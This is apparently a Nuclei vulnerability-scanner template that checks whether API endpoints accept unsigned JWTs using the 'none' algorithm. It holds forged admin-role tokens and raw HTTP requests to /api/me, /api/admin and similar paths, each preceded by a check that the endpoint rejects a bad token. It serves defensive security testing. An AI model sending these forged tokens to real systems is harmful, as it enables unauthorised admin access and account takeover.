id: jwt-none-algorithm-deep-detection

info:
  name: JWT None Algorithm Bypass - Deep Variant Detection
  author: achraf-chehboun
  severity: critical
  description: |
    Comprehensive detection for JWT 'none' algorithm acceptance including all case-folding
    variants. Uses a mandatory baseline check — the endpoint must reject invalid tokens
    (401/403) before testing none-alg variants. Requires JSON content-type and excludes
    HTML pages to prevent false positives from catch-all routes.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-345
  metadata:
    max-request: 12
  tags: jwt,none-algorithm,auth-bypass,detection-only

variables:
  jwt_none_lower: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
  jwt_none_cap: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
  jwt_none_upper: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
  jwt_none_mixed: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
  jwt_none_mixed2: "eyJhbGciOiJub05lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
  jwt_hs256_nosig: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."

http:
  # Phase 1: Verify the API endpoint exists and rejects bad tokens
  # Phase 2: Test none-alg variants against same endpoint
  - raw:
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.garbage.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_lower}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_cap}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_upper}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_mixed}}
        Accept: application/json
      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_hs256_nosig}}
        Accept: application/json

    req-condition: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: none-alg-bypass-confirmed
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && !contains(body_2, "<!DOCTYPE")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_3 == 200 && contains(content_type_3, "json") && !contains(body_3, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_4 == 200 && contains(content_type_4, "json") && !contains(body_4, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_5 == 200 && contains(content_type_5, "json") && !contains(body_5, "<html")'
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_6 == 200 && contains(content_type_6, "json") && !contains(body_6, "<html")'
        condition: or

    extractors:
      - type: regex
        name: response-identity
        group: 0
        regex:
          - '(?i)"(?:sub|user_?id|email|username|role|admin)"\s*:\s*"[^"]*"'

  # Test alternate API paths with baseline rejection check
  - raw:
      - |
        GET {{BaseURL}}/api/v1/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.garbage.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/v1/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_lower}}
        Accept: application/json

    req-condition: true
    matchers:
      - type: dsl
        name: alt-path-user-bypass
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'

  - raw:
      - |
        GET {{BaseURL}}/api/v1/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.garbage.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/v1/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_lower}}
        Accept: application/json

    req-condition: true
    matchers:
      - type: dsl
        name: alt-path-profile-bypass
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'

  - raw:
      - |
        GET {{BaseURL}}/api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer invalid.garbage.xnlbz
        Accept: application/json
      - |
        GET {{BaseURL}}/api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_lower}}
        Accept: application/json

    req-condition: true
    matchers:
      - type: dsl
        name: alt-path-admin-bypass
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'
